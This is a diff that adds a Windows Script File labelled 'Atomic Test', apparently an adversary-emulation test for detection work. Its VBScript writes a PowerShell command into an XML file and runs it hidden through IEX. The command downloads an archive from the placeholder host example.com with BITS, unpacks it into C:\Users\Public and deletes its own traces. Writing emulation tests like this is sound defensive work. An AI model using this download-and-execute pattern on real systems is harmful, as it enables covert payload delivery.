@@ -1,0 +1,20 @@
+<package>
+  <job id="Atomic Test">
+    <script language="VBScript">
+          Set objShell = WScript.CreateObject("WScript.Shell")
+          xml = "<command>" & _
+                 "	Start-BitsTransfer -Source ""http://example.com/"" -Destination ""C:\Users\Public\atomic_test2.zip""; " & _
+                 "	Expand-Archive -Path ""C:\Users\Public\atomic_test2.zip"" -DestinationPath ""C:\Users\Public\"" -Force; " &_       
+                 "	Remove-Item -Path ""C:\Users\Public\atomic_test2.zip"" -Force; " &_
+                 "</command>"
+
+          Set objFSO = CreateObject ("Scripting.FileSystemObject")
+          Set objFile = objFSO.CreateTextFile("C:\Users\Public\test3.xml", True)
+          objFile.Write xml
+          objFile.Close
+          objShell.Run "powershell -command ""[xml]$xmldoc = Get-Content 'C:\Users\Public\test3.xml'; $command = $xmldoc.command; IEX $command""", 0, True
+          
+          objFSO.DeleteFile "C:\Users\Public\test3.xml"
+    </script>
+  </job>
+</package>
